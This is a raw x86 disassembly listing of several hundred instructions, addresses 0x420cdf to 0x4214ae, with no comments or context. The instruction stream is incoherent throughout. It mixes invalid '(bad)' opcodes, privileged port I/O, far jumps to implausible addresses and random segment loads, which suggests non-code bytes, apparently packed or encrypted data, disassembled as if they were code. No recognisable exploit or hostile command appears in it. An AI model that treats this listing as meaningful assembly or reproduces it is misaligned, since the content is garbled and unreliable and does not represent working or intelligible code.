  420cdf:	imul   esp
  420ce1:	xchg   eax,esi
  420ce3:	popf   
  420ce4:	inc    ebp
  420ce5:	mov    dh,0x65
  420ce7:	push   ebx
  420ce8:	add    BYTE PTR [ebp+0x2d26df8a],0x3b
  420cef:	xchg   BYTE PTR [ebp+ebx*8+0x69],dh
  420cf3:	fwait
  420cf4:	out    dx,al
  420cf5:	and    DWORD PTR [ebp+ebp*8-0x30],ecx
  420cf9:	test   BYTE PTR [ecx-0x47ab610a],bh
  420cff:	push   cs
  420d00:	adc    BYTE PTR [edi+ecx*2-0x5b],bh
  420d04:	loop   0x420ce2
  420d06:	pop    edi
  420d07:	fidivr DWORD PTR [ebx]
  420d09:	not    DWORD PTR [eax-0x6d]
  420d0c:	dec    ebp
  420d0d:	xlat   BYTE PTR ds:[ebx]
  420d0e:	pop    edi
  420d0f:	out    0x49,al
  420d11:	in     al,dx
  420d12:	dec    esp
  420d13:	push   esi
  420d14:	xchg   ebx,eax
  420d15:	mov    cl,0x53
  420d17:	js     0x420d4c
  420d19:	inc    edi
  420d1a:	mov    BYTE PTR [edi+0x32],bh
  420d1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d1e:	sub    eax,0x8c9232d
  420d23:	jl     0x420d73
  420d25:	add    eax,0x549da577
  420d2a:	or     eax,0x945cbada
  420d2f:	jmp    0xd9cc6547
  420d34:	inc    ebp
  420d35:	ret    
  420d36:	pop    eax
  420d37:	add    ecx,DWORD PTR [esi-0x3]
  420d3a:	nop
  420d3b:	(bad)  
  420d3c:	push   ecx
  420d3d:	cmc    
  420d3e:	adc    ebx,DWORD PTR [eax]
  420d40:	add    al,0x1a
  420d42:	ja     0x420da5
  420d44:	add    al,0xbc
  420d46:	popa   
  420d47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d48:	ror    BYTE PTR [esi-0x17],0xd0
  420d4c:	mov    ebx,0xd6d65459
  420d51:	mov    gs,WORD PTR [esi-0x511097df]
  420d57:	ins    BYTE PTR es:[edi],dx
  420d58:	adc    BYTE PTR [ebx-0x2f],dh
  420d5b:	cld    
  420d5c:	and    eax,0x5a8c7a06
  420d61:	aas    
  420d62:	add    eax,DWORD PTR [ebp+0xb]
  420d65:	jl     0x420db7
  420d67:	scas   al,BYTE PTR es:[edi]
  420d68:	or     al,0x84
  420d6a:	mov    ch,0x54
  420d6c:	(bad)  
  420d6d:	sbb    BYTE PTR [edi+0x65ea002],al
  420d73:	js     0x420d46
  420d75:	push   ebx
  420d76:	push   eax
  420d77:	sbb    ch,dh
  420d79:	or     DWORD PTR [edx-0x27f8254b],edi
  420d7f:	and    DWORD PTR [ebp+0x4ccf9f92],esi
  420d85:	mov    edi,0xb9af12ca
  420d8a:	mov    ebx,0x4ab4638a
  420d8f:	and    cl,BYTE PTR [eax-0x7f]
  420d92:	es and al,0xd1
  420d95:	push   esp
  420d96:	sub    al,0xa9
  420d98:	pop    ecx
  420d99:	ret    
  420d9a:	or     DWORD PTR [eax+edi*4-0x2cc8a0ae],ebx
  420da1:	adc    ebx,ecx
  420da3:	(bad)  
  420da4:	fnstsw WORD PTR [edi]
  420da6:	repnz or al,cl
  420da9:	jmp    0x83ef5ce5
  420dae:	daa    
  420daf:	out    dx,al
  420db0:	(bad)  [ecx+0x25]
  420db3:	jae    0x420db3
  420db5:	jbe    0x420d6c
  420db7:	jne    0x420d39
  420db9:	popf   
  420dba:	retf   0x7daf
  420dbd:	repz int3 
  420dbf:	into   
  420dc0:	shl    dl,1
  420dc2:	popf   
  420dc3:	push   cs
  420dc4:	fiadd  WORD PTR [edx]
  420dc6:	(bad)  
  420dc7:	pop    esi
  420dc8:	sar    BYTE PTR [ebp+0x17c177fa],cl
  420dce:	mov    ch,BYTE PTR [ebp-0x7]
  420dd1:	fcmovnu st,st(5)
  420dd3:	sub    eax,0x5ee7953e
  420dd8:	cld    
  420dd9:	push   esp
  420dda:	jae    0x420d9a
  420ddc:	(bad)  
  420ddd:	fdiv   DWORD PTR ds:0xfee3f85f
  420de3:	pusha  
  420de4:	fnstcw WORD PTR [ecx+0x3a3ac4d1]
  420dea:	or     al,0xc5
  420dec:	pushf  
  420ded:	aaa    
  420dee:	ret    
  420def:	fiadd  DWORD PTR [ebx-0x6f]
  420df2:	dec    esp
  420df3:	iret   
  420df4:	cmc    
  420df5:	es jnp 0x420dc0
  420df8:	stos   DWORD PTR es:[edi],eax
  420df9:	shl    BYTE PTR [eax-0x78],0x42
  420dfd:	sbb    DWORD PTR [edi],0x13c9ff07
  420e03:	loopne 0x420e84
  420e05:	into   
  420e06:	pop    ecx
  420e07:	adc    al,0x23
  420e09:	cmp    ebx,edx
  420e0b:	and    esi,edx
  420e0d:	lock lock inc esp
  420e10:	stos   DWORD PTR es:[edi],eax
  420e11:	push   ebp
  420e12:	push   es
  420e13:	iret   
  420e14:	pop    edx
  420e15:	ret    0x7cc4
  420e18:	test   eax,0xe811efe7
  420e1d:	pop    ss
  420e1e:	mov    esi,DWORD PTR [ebx-0x7b2a5392]
  420e24:	in     al,dx
  420e25:	das    
  420e26:	lahf   
  420e27:	inc    esi
  420e28:	lock ins DWORD PTR es:[edi],dx
  420e2a:	in     eax,0x57
  420e2c:	dec    edi
  420e2d:	stc    
  420e2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e2f:	dec    ecx
  420e30:	imul   ecx,DWORD PTR [edx],0x83caf5d4
  420e36:	test   al,0x6
  420e38:	ror    DWORD PTR [esi+0x3c431a69],cl
  420e3e:	shl    ebx,cl
  420e40:	imul   edi,DWORD PTR [eax],0xbd56654d
  420e46:	sbb    DWORD PTR [ebp+0x1f],edi
  420e49:	in     al,dx
  420e4a:	fmul   st(5),st
  420e4c:	pop    edi
  420e4d:	jecxz  0x420e5b
  420e4f:	pushf  
  420e50:	pop    ecx
  420e51:	ret    0xf4a5
  420e54:	mov    al,0x64
  420e56:	dec    ebx
  420e57:	fisub  DWORD PTR [esi+0x51]
  420e5a:	dec    edx
  420e5b:	icebp  
  420e5c:	add    DWORD PTR [ebp-0x125c4669],esp
  420e62:	ins    BYTE PTR es:[edi],dx
  420e63:	xor    eax,0x303a767b
  420e68:	into   
  420e69:	pop    es
  420e6a:	mov    WORD PTR [ebp+0x2dc57324],gs
  420e70:	adc    al,0x7c
  420e72:	mov    eax,0x85241cdf
  420e77:	out    0x41,eax
  420e79:	repnz cmp al,0xdf
  420e7c:	loope  0x420e47
  420e7e:	jo     0x420efa
  420e80:	fnsave ds:0xfdd34617
  420e86:	xchg   esi,eax
  420e87:	inc    ecx
  420e88:	xchg   ebp,eax
  420e89:	enter  0x51be,0xef
  420e8d:	dec    edi
  420e8e:	hlt    
  420e8f:	mov    al,ds:0x31299bef
  420e94:	add    bl,bl
  420e96:	cmp    BYTE PTR [ecx-0x2623be79],dh
  420e9c:	out    0x29,eax
  420e9e:	jno    0x420e3f
  420ea0:	push   0x67
  420ea2:	xor    cl,BYTE PTR [eax+edi*4]
  420ea5:	xchg   edx,eax
  420ea6:	repz adc eax,eax
  420ea9:	cmp    ah,ch
  420eab:	(bad)  [edx-0x8501ca0]
  420eb1:	dec    edx
  420eb2:	iret   
  420eb3:	add    eax,0x7d3a881f
  420eb8:	retf   
  420eb9:	jnp    0x420e75
  420ebb:	mov    ah,0xba
  420ebd:	pminub mm3,QWORD PTR [esi-0x7ee28b4]
  420ec4:	xor    al,BYTE PTR [edi+0x1be613f5]
  420eca:	mov    al,0xd6
  420ecc:	pop    edi
  420ecd:	enter  0x9fde,0x7a
  420ed1:	xchg   ebx,eax
  420ed2:	fmul   QWORD PTR [ebx]
  420ed4:	(bad)  
  420ed5:	push   eax
  420ed6:	adc    eax,ebx
  420ed8:	hlt    
  420ed9:	mov    bl,0x5c
  420edb:	int3   
  420edc:	adc    edi,DWORD PTR [esp+ebx*1+0x1c]
  420ee0:	call   DWORD PTR [eax-0x52]
  420ee3:	pop    ebx
  420ee4:	mov    esi,0xea7d7c08
  420ee9:	ss ffreep st(2)
  420eec:	adc    esi,DWORD PTR [eax]
  420eee:	es (bad) 
  420ef0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ef1:	ret    
  420ef2:	inc    eax
  420ef3:	int3   
  420ef4:	pop    edi
  420ef5:	xchg   DWORD PTR [ebx],edx
  420ef7:	pop    ecx
  420ef8:	jge    0x420ea3
  420efa:	and    DWORD PTR [edi-0x53],ebx
  420efd:	loop   0x420ed5
  420eff:	and    ah,ch
  420f01:	jge    0x420ed5
  420f03:	adc    al,0x85
  420f05:	lock and eax,DWORD PTR [eax-0x7016e861]
  420f0c:	aaa    
  420f0d:	jg     0x420f87
  420f0f:	add    ebp,ebx
  420f11:	adc    al,0xba
  420f13:	pop    eax
  420f14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f15:	jns    0x420eda
  420f17:	and    eax,0x55834766
  420f1c:	xchg   ebx,eax
  420f1d:	loop   0x420eb7
  420f1f:	imul   ebx,DWORD PTR [edx],0xffffff8d
  420f22:	xchg   ebp,eax
  420f23:	dec    edi
  420f24:	jecxz  0x420ee5
  420f26:	mov    ss,WORD PTR [ebp-0x575d959c]
  420f2c:	retf   0xb70d
  420f2f:	cli    
  420f30:	std    
  420f31:	mov    dl,0x65
  420f33:	xchg   edx,eax
  420f34:	or     al,0xd3
  420f36:	pop    edx
  420f37:	call   0xf7561270
  420f3c:	jl     0x420ee4
  420f3e:	ret    0x989e
  420f41:	retf   
  420f42:	add    BYTE PTR [ebx],ch
  420f44:	test   BYTE PTR [eax+0x701ce88a],al
  420f4a:	adc    BYTE PTR [eax+0x2a],dh
  420f4d:	jbe    0x420f2f
  420f4f:	mov    esp,0x41745a4a
  420f54:	mov    al,ds:0xb969da0e
  420f59:	push   ecx
  420f5a:	aaa    
  420f5b:	les    esi,FWORD PTR [eax+eiz*2]
  420f5e:	xor    bl,bl
  420f60:	lock mov esi,0x97a1b1bb
  420f66:	retf   0xb4a2
  420f69:	shl    bl,1
  420f6b:	or     BYTE PTR [esp+eax*4+0x6f3aef5d],dh
  420f72:	pusha  
  420f73:	xlat   BYTE PTR ds:[ebx]
  420f74:	cwde   
  420f75:	out    0xb2,eax
  420f77:	retf   
  420f78:	fisttp DWORD PTR [ebx+0x77a5c3f3]
  420f7e:	fidivr WORD PTR [esi+0xcca0350]
  420f84:	push   edi
  420f85:	push   0x5d4b7ee0
  420f8a:	jge    0x420f85
  420f8c:	out    dx,eax
  420f8d:	pop    ds
  420f8e:	and    al,0x6
  420f90:	cs push ecx
  420f92:	mov    eax,ds:0x8ba713ce
  420f97:	es loope 0x420ff8
  420f9a:	add    BYTE PTR [eax-0x5181a153],0x39
  420fa1:	or     DWORD PTR [bp+si-0x57],0xae6faec4
  420fa9:	enter  0x4c90,0x5b
  420fad:	or     ebx,DWORD PTR [eax-0x2e]
  420fb0:	(bad)  
  420fb2:	stos   BYTE PTR es:[edi],al
  420fb3:	test   DWORD PTR [eax+0x79],esp
  420fb6:	adc    BYTE PTR [edi+0x61],al
  420fb9:	std    
  420fba:	popf   
  420fbb:	add    edi,DWORD PTR [edx+ebp*2-0x4ab3dfe7]
  420fc2:	dec    esp
  420fc3:	sbb    ch,BYTE PTR [ecx+ebx*2-0x7]
  420fc7:	fwait
  420fc8:	pop    edx
  420fc9:	xchg   bp,ax
  420fcb:	addr16 and BYTE PTR [bp+si-0x2c],0xcd
  420fd1:	or     BYTE PTR [ebx+edi*8],ch
  420fd4:	repz das 
  420fd6:	retf   0x99a4
  420fd9:	shl    BYTE PTR [eax+0x1ca919c],1
  420fdf:	jo     0x420fab
  420fe1:	sub    al,0xd9
  420fe3:	mov    ebp,0xb641f0b4
  420fe8:	cmc    
  420fe9:	in     eax,dx
  420fea:	retf   0xb4e0
  420fed:	mov    ecx,ebx
  420fef:	pop    edi
  420ff0:	lods   eax,DWORD PTR ds:[esi]
  420ff1:	sbb    eax,0xef3ce1e1
  420ff6:	mov    DWORD PTR [edx-0x1544e987],0x86b848f7
  421000:	(bad)  
  421001:	mov    dh,0xaa
  421003:	into   
  421004:	aam    0x6d
  421006:	xor    bh,BYTE PTR ds:[esi]
  421009:	xor    BYTE PTR [edi-0x3d6cc0b7],ah
  42100f:	in     al,0xdf
  421011:	dec    esi
  421012:	push   ebx
  421013:	mov    ch,BYTE PTR [eax+esi*1-0x6b]
  421017:	xor    eax,0x2f395872
  42101c:	ror    al,cl
  42101e:	mov    BYTE PTR [eax],cl
  421020:	lock jno 0x421075
  421023:	add    al,0x14
  421025:	add    BYTE PTR ds:0x2da30687,ah
  42102b:	jl     0x42101f
  42102d:	mov    dh,0x53
  42102f:	sti    
  421030:	push   es
  421031:	and    ebx,DWORD PTR [ebx]
  421033:	stc    
  421034:	scas   eax,DWORD PTR es:[edi]
  421035:	lods   al,BYTE PTR ds:[esi]
  421036:	rol    BYTE PTR [edi],cl
  421038:	mov    ds:0x3621333,eax
  42103d:	mov    ebp,0xc01b41ab
  421042:	fisub  WORD PTR [ecx+0x23]
  421045:	stos   DWORD PTR es:[edi],eax
  421046:	loopne 0x421010
  421048:	int    0xfa
  42104a:	push   esp
  42104b:	call   0x7535:0xe4d19126
  421052:	lahf   
  421053:	ja     0x420fff
  421055:	push   ecx
  421056:	outs   dx,BYTE PTR ds:[esi]
  421057:	mov    ch,0x20
  421059:	mov    eax,ebp
  42105b:	xor    al,0x99
  42105d:	mov    al,ds:0x4618c12
  421062:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421063:	or     al,0x1e
  421065:	aas    
  421066:	lahf   
  421067:	adc    ah,ah
  421069:	add    BYTE PTR [edi-0x24],ch
  42106c:	mov    BYTE PTR [esi+0x75],0x91
  421070:	inc    ecx
  421071:	inc    esp
  421072:	fstp   DWORD PTR [ecx]
  421074:	jecxz  0x42109d
  421076:	and    BYTE PTR [ecx+esi*8-0x2d388f7f],dh
  42107d:	jno    0x421072
  42107f:	cmp    BYTE PTR [ecx+0xc],dh
  421082:	ret    
  421083:	sbb    al,cl
  421085:	fcmovnb st,st(2)
  421087:	push   eax
  421088:	fist   DWORD PTR [edx-0x6c]
  42108b:	sub    eax,0xb402beef
  421090:	dec    edi
  421091:	rep outs dx,DWORD PTR ds:[esi]
  421093:	cli    
  421094:	mov    eax,0xcf58f9fe
  421099:	fisub  DWORD PTR [esi]
  42109b:	and    al,0x86
  42109d:	shl    dh,0x4
  4210a0:	adc    bh,BYTE PTR [eax]
  4210a2:	popf   
  4210a3:	fsub   DWORD PTR [ebx+0x31b82d7a]
  4210a9:	or     bh,bl
  4210ab:	mov    ?,WORD PTR [ecx+0x5efe0306]
  4210b1:	mov    es,esp
  4210b3:	fadd   DWORD PTR [eax+0x74d619f3]
  4210b9:	jne    0x42106d
  4210bb:	xchg   edi,eax
  4210bc:	(bad)  
  4210be:	sar    BYTE PTR ds:0x6a91d5e3,1
  4210c4:	adc    ebx,0xffffffd1
  4210c7:	leave  
  4210c8:	shr    DWORD PTR [ebx+0x53ec2bdd],cl
  4210ce:	imul   eax,DWORD PTR [eax+ebx*8+0x3c2cdf58],0x12
  4210d6:	adc    BYTE PTR [esi],cl
  4210d8:	xor    esp,0x35742c45
  4210de:	popf   
  4210df:	jp     0x4210af
  4210e1:	andps  xmm3,xmm0
  4210e4:	icebp  
  4210e5:	dec    eax
  4210e6:	dec    edi
  4210e7:	mov    ebx,0x3ea3b58c
  4210ec:	sbb    al,0xfc
  4210ee:	rcr    DWORD PTR [edx+0x59],1
  4210f1:	and    eax,0x161812bb
  4210f6:	mov    ecx,0xe429e777
  4210fb:	xchg   DWORD PTR ds:0xb2e72971,ecx
  421101:	ret    
  421102:	sbb    DWORD PTR [esi+0x21603b5d],ecx
  421108:	jmp    0x9270c06f
  42110d:	dec    edi
  42110e:	cs mov esp,0xc1a44096
  421114:	pop    edi
  421115:	inc    esi
  421116:	mov    edi,0xc0b7872a
  42111b:	jmp    0x1f537534
  421120:	fwait
  421121:	jl     0x421166
  421123:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421124:	pop    es
  421125:	mov    bl,0x68
  421127:	mov    ebx,0x5051cc70
  42112c:	cmp    ch,al
  42112e:	xchg   ecx,eax
  42112f:	(bad)  
  421131:	mov    esi,0x48c4fd4d
  421136:	mov    cl,0xd3
  421138:	add    BYTE PTR [edx],0xcf
  42113b:	(bad)
  42113e:	rcr    BYTE PTR [ebx],0xd5
  421141:	js     0x4210ee
  421143:	mov    gs,ebp
  421145:	adc    DWORD PTR [ebx-0x4],esp
  421148:	pop    ebx
  421149:	shl    BYTE PTR [esp+ebx*2],1
  42114c:	loop   0x421132
  42114e:	jbe    0x421196
  421150:	scas   al,BYTE PTR es:[edi]
  421151:	bnd jp 0x4210e2
  421154:	loopne 0x421184
  421156:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421157:	mov    ah,0x95
  421159:	dec    edx
  42115a:	jnp    0x421107
  42115c:	repnz shr DWORD PTR ds:0xd33e94f6,cl
  421163:	cmc    
  421164:	push   ebp
  421165:	jae    0x4210ed
  421167:	or     ecx,DWORD PTR [edx+0x72]
  42116a:	(bad)  
  42116b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42116c:	inc    ecx
  42116d:	aas    
  42116e:	sub    edx,ebx
  421170:	mov    al,0x8
  421172:	aad    0xa
  421174:	push   0xf0de6340
  421179:	sti    
  42117a:	mov    dh,0x9e
  42117c:	lods   eax,DWORD PTR ds:[esi]
  42117d:	mov    ebx,0x5d6ed0b2
  421182:	aad    0x10
  421184:	aad    0xcc
  421186:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421187:	das    
  421188:	jmp    FWORD PTR [eax-0x4f]
  42118b:	or     BYTE PTR ds:0x235e7d9a,dl
  421191:	les    edi,FWORD PTR [ecx+edi*4]
  421194:	fwait
  421195:	mov    al,0xe0
  421197:	cwde   
  421198:	sbb    DWORD PTR [ecx],ebx
  42119a:	pop    edx
  42119b:	out    0x7,al
  42119d:	adc    cl,cl
  42119f:	aam    0x57
  4211a1:	ss xchg esp,eax
  4211a3:	ret    0xe605
  4211a6:	mov    eax,0x522e0e7e
  4211ab:	inc    ecx
  4211ac:	pop    edi
  4211ad:	cdq    
  4211ae:	cmp    eax,0x150933d4
  4211b3:	popa   
  4211b4:	call   0xd91f:0x3a5564e7
  4211bb:	push   ebx
  4211bc:	mov    ebp,0x4a7a1e2d
  4211c1:	sar    DWORD PTR [ebx-0x78],0x4c
  4211c5:	mov    ebp,0x14700095
  4211ca:	mov    bh,0x8
  4211cc:	loopne 0x421157
  4211ce:	into   
  4211cf:	mov    ecx,0x1f4fa9b2
  4211d4:	sbb    esi,DWORD PTR [edx-0x7687cc]
  4211da:	shl    esp,1
  4211dc:	jne    0x421161
  4211de:	inc    esi
  4211df:	or     ebx,DWORD PTR [edx]
  4211e1:	out    dx,al
  4211e2:	je     0x42118e
  4211e4:	and    bl,dl
  4211e6:	in     eax,dx
  4211e7:	pop    es
  4211e8:	adc    eax,0x656934de
  4211ed:	js     0x4211fb
  4211ef:	jnp    0x421200
  4211f1:	or     eax,DWORD PTR [ebx]
  4211f3:	(bad)  [ebx-0x1f]
  4211f6:	cmc    
  4211f7:	adc    BYTE PTR [edi+0x53ec120],bl
  4211fd:	sar    BYTE PTR [edi],cl
  4211ff:	dec    ecx
  421200:	cmp    DWORD PTR [esi-0x21],eax
  421203:	add    DWORD PTR [edx+ebp*2],esp
  421206:	les    esi,FWORD PTR [ebx-0x47]
  421209:	sbb    DWORD PTR [edx+0x74],edx
  42120c:	sbb    al,0xec
  42120e:	xchg   ebx,eax
  42120f:	scas   al,BYTE PTR es:[edi]
  421210:	es dec ebx
  421212:	dec    ebx
  421213:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421214:	nop
  421215:	push   ds
  421216:	mov    ebp,0x514d5fdf
  42121b:	push   0xffffff90
  42121d:	mov    esi,0x4ddd1e5a
  421222:	pop    ss
  421223:	xchg   ebp,eax
  421224:	stos   DWORD PTR es:[edi],eax
  421225:	(bad)  
  421226:	and    BYTE PTR [edi+0x7891107c],al
  42122c:	jb     0x4211d5
  42122e:	xchg   ecx,eax
  42122f:	mov    ebx,0x4a2ee802
  421234:	adc    dl,al
  421236:	xor    esi,DWORD PTR [edx+0x23]
  421239:	imul   esi,DWORD PTR [ecx],0x2c
  42123c:	adc    DWORD PTR [edi-0x74],edi
  42123f:	push   ebx
  421240:	sbb    BYTE PTR [edx],al
  421242:	cs inc edi
  421244:	dec    ebp
  421245:	pusha  
  421246:	cmc    
  421247:	push   ebx
  421248:	nop
  421249:	imul   esi,DWORD PTR [esi],0x6f6a70db
  42124f:	xor    DWORD PTR [edx],ecx
  421251:	scas   eax,DWORD PTR es:[edi]
  421252:	cmc    
  421253:	push   ebx
  421254:	fld    TBYTE PTR [edi+0x56]
  421257:	leave  
  421258:	mov    ss,WORD PTR [esi]
  42125a:	js     0x421231
  42125c:	mov    esp,0xaccfec7b
  421261:	cmp    eax,0xd43b1dfb
  421266:	push   esi
  421267:	(bad)  
  421268:	jg     0x4212a7
  42126a:	jbe    0x42122a
  42126c:	outs   dx,DWORD PTR ds:[esi]
  42126d:	inc    ecx
  42126e:	mov    ah,0x8c
  421270:	cmp    BYTE PTR [edx-0x2d],al
  421273:	push   0x15b2bf70
  421278:	enter  0xf561,0x32
  42127c:	icebp  
  42127d:	cmp    al,0xc5
  42127f:	xor    esi,DWORD PTR [ecx-0x2efdde24]
  421285:	jbe    0x421305
  421287:	inc    ecx
  421288:	lahf   
  421289:	aas    
  42128a:	jl     0x421247
  42128c:	data16 mov cl,0x6d
  42128f:	pop    esp
  421290:	adc    edx,DWORD PTR [esi-0x5feef2c8]
  421296:	xlat   BYTE PTR ds:[ebx]
  421297:	mov    al,ds:0xbe67ba05
  42129c:	mov    bl,0xa
  42129e:	in     al,dx
  42129f:	push   ss
  4212a0:	cmp    DWORD PTR [edi],edx
  4212a2:	ret    0xcd8c
  4212a5:	xchg   ebx,eax
  4212a6:	(bad)  
  4212a8:	sbb    BYTE PTR [esi+eiz*2],0x91
  4212ac:	adc    eax,DWORD PTR [ecx+0x6f9d974d]
  4212b2:	mov    ecx,0x43d8ba1f
  4212b7:	jbe    0x421327
  4212b9:	pop    ebp
  4212ba:	fisub  WORD PTR [ebx+0xc0d275e]
  4212c0:	sub    ah,dh
  4212c2:	cli    
  4212c3:	adc    BYTE PTR [ecx+0x4dd091ab],bh
  4212c9:	enter  0x7d42,0x3f
  4212cd:	mov    edi,0xab55f45f
  4212d2:	out    dx,al
  4212d3:	and    ecx,DWORD PTR [edi]
  4212d5:	sbb    eax,0xd763b390
  4212da:	(bad)  
  4212db:	mov    eax,0x60182117
  4212e0:	and    DWORD PTR [eax],ecx
  4212e2:	shl    BYTE PTR [edi+0x23ff2af],1
  4212e8:	pop    edi
  4212e9:	icebp  
  4212ea:	cmp    al,0xa5
  4212ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212ed:	push   es
  4212ee:	mov    eax,0x375bd100
  4212f3:	pop    ecx
  4212f4:	imul   ebp,DWORD PTR ds:0xfeab2fd7,0xfffffffe
  4212fb:	lods   al,BYTE PTR ds:[esi]
  4212fc:	inc    esi
  4212fd:	xor    al,0x2c
  4212ff:	std    
  421300:	jne    0x4212b0
  421302:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421303:	iret   
  421304:	jbe    0x421316
  421306:	loopne 0x421319
  421308:	or     BYTE PTR [ebp-0x1c],ch
  42130b:	in     al,0xec
  42130d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42130e:	cdq    
  42130f:	jae    0x421351
  421311:	jns    0x4212d8
  421313:	push   0x5c
  421315:	sub    edi,DWORD PTR [edi]
  421317:	xchg   ebx,eax
  421318:	adc    eax,0x57ba16c4
  42131d:	fdiv   QWORD PTR [ebx+ecx*8]
  421320:	jb     0x421386
  421322:	sub    BYTE PTR [ebx-0xf],dl
  421325:	das    
  421326:	lahf   
  421327:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421328:	in     eax,0x72
  42132a:	lahf   
  42132b:	sti    
  42132c:	shl    esi,1
  42132e:	push   ss
  42132f:	repz jmp 0x421373
  421332:	mov    al,ds:0x4bf5cd49
  421337:	sub    esi,esp
  421339:	xchg   esi,eax
  42133a:	or     cl,dl
  42133c:	dec    edx
  42133d:	cmp    eax,ebx
  42133f:	es push ebx
  421341:	lds    ebp,FWORD PTR [edx-0x1c3d8f31]
  421347:	or     esp,DWORD PTR [eax-0x7c]
  42134a:	stos   BYTE PTR es:[edi],al
  42134b:	mov    al,0xbe
  42134d:	mov    ds:0xad87dd25,al
  421352:	push   es
  421353:	ret    0x4a7d
  421356:	xlat   BYTE PTR ds:[ebx]
  421357:	iret   
  421358:	ins    DWORD PTR es:[edi],dx
  421359:	lock push edi
  42135b:	cmp    al,0x37
  42135d:	fmul   QWORD PTR [eax]
  42135f:	mov    esi,0x2eb226a0
  421364:	jp     0x4212f7
  421366:	imul   esi,ebx,0x201af0ef
  42136c:	inc    ebx
  42136d:	add    edx,ecx
  42136f:	sahf   
  421370:	je     0x42130d
  421372:	xchg   ecx,eax
  421373:	or     eax,0x605e37db
  421378:	fbstp  TBYTE PTR [ebp-0x4b]
  42137b:	dec    eax
  42137c:	cli    
  42137d:	mov    eax,ds:0x11a32ba
  421382:	pop    es
  421383:	not    BYTE PTR [ecx+0x17]
  421386:	adc    eax,0xdbb27d46
  42138b:	es ins BYTE PTR es:[edi],dx
  42138d:	sbb    eax,0x238221c2
  421392:	in     eax,0x3c
  421394:	push   eax
  421395:	pop    es
  421396:	xchg   BYTE PTR [ecx+0x2e872fad],ch
  42139c:	retf   0x70da
  42139f:	push   eax
  4213a0:	mov    ah,0x53
  4213a2:	repnz adc DWORD PTR [edx+0x25d38f59],edx
  4213a9:	or     BYTE PTR [ecx+0x4f],ch
  4213ac:	mov    esp,0x6ba6ecc7
  4213b1:	push   0xffffffec
  4213b3:	xchg   ebx,eax
  4213b4:	out    dx,eax
  4213b5:	in     al,0x34
  4213b7:	push   ecx
  4213b8:	push   eax
  4213b9:	mov    bl,0xdf
  4213bb:	jno    0x4213bc
  4213bd:	scas   eax,DWORD PTR es:[edi]
  4213be:	ror    ch,1
  4213c0:	lods   eax,DWORD PTR ds:[esi]
  4213c1:	das    
  4213c2:	mov    bh,BYTE PTR [esi]
  4213c4:	mov    esp,0x1e49d93d
  4213c9:	mov    esp,0x9247a25e
  4213ce:	jmp    0x421355
  4213d0:	lds    ebx,FWORD PTR [eax-0xb00b785]
  4213d6:	dec    eax
  4213d7:	aad    0xfa
  4213d9:	mov    ch,0x82
  4213db:	iret   
  4213dc:	mov    ebp,0xa72007db
  4213e1:	loope  0x421422
  4213e3:	(bad)  
  4213e4:	not    BYTE PTR [esi+0x57fb7b17]
  4213ea:	fsub   QWORD PTR [eax-0x595c238e]
  4213f0:	cmp    eax,0x57182ebc
  4213f5:	jle    0x4213d9
  4213f7:	jns    0x42137d
  4213f9:	into   
  4213fa:	stc    
  4213fb:	add    DWORD PTR [esp+ebp*8],esi
  4213fe:	sti    
  4213ff:	or     eax,DWORD PTR [eax]
  421401:	push   ecx
  421402:	cmp    ebp,DWORD PTR [edx+0x5c]
  421405:	mov    BYTE PTR [ebp-0x3],dh
  421408:	or     DWORD PTR [eax+0x721a7148],edx
  42140e:	fistp  DWORD PTR [ebp+0x583ea337]
  421414:	mov    edi,0x9cf2a15c
  421419:	inc    edx
  42141a:	inc    ebp
  42141b:	cmp    BYTE PTR [ecx+0x3f],ch
  42141e:	jmp    0x421471
  421420:	pop    esi
  421421:	ds sbb eax,0x96ac0cdd
  421427:	lock rol DWORD PTR [edi],0xd4
  42142b:	and    DWORD PTR [eax+0x64],ebx
  42142e:	push   0xffffff85
  421430:	and    esp,DWORD PTR [esi+0xcd0dad8]
  421436:	into   
  421437:	or     al,0xe1
  421439:	fisubr WORD PTR [ebx-0x15]
  42143c:	pop    edx
  42143d:	or     bh,BYTE PTR [esi]
  42143f:	and    DWORD PTR [ecx],ebp
  421441:	hlt    
  421442:	xchg   ebp,eax
  421443:	cmc    
  421444:	ret    
  421445:	sbb    cl,dl
  421447:	mov    edx,0xcdbc559
  42144c:	repz xchg edi,eax
  42144e:	mov    DWORD PTR [ecx+0x76],edi
  421451:	test   eax,0xd3bbafc9
  421456:	in     al,0xc2
  421458:	jecxz  0x42144b
  42145a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42145b:	jecxz  0x421407
  42145d:	mov    dl,0x40
  42145f:	adc    BYTE PTR [eax-0x7e],bh
  421462:	pop    esi
  421463:	inc    esp
  421464:	mov    edi,0xf83c837e
  421469:	mov    dl,0xf0
  42146b:	jp     0x42149a
  42146d:	dec    ecx
  42146e:	mov    esp,0xab20a736
  421473:	mov    ah,0xb4
  421475:	xchg   esp,eax
  421476:	push   ecx
  421477:	mov    cl,0xcf
  421479:	jo     0x4214f7
  42147b:	nop
  42147c:	aaa    
  42147d:	or     BYTE PTR [esi-0x4],bl
  421480:	inc    di
  421482:	mov    ebp,edx
  421484:	aaa    
  421485:	lods   al,BYTE PTR ds:[esi]
  421486:	popf   
  421487:	cmp    DWORD PTR [edi],esi
  421489:	test   DWORD PTR gs:[bp-0x6ba6],0x372e0ee
  421493:	loope  0x421457
  421495:	enter  0x5a5a,0xe8
  421499:	test   ebx,esi
  42149b:	jmp    0x8b4e:0xa3a067d3
  4214a2:	add    eax,0xb9ebc4c2
  4214a7:	ins    DWORD PTR es:[edi],dx
  4214a8:	sub    BYTE PTR ds:0x1bfffaaa,bl
  4214ae:	out    dx,eax
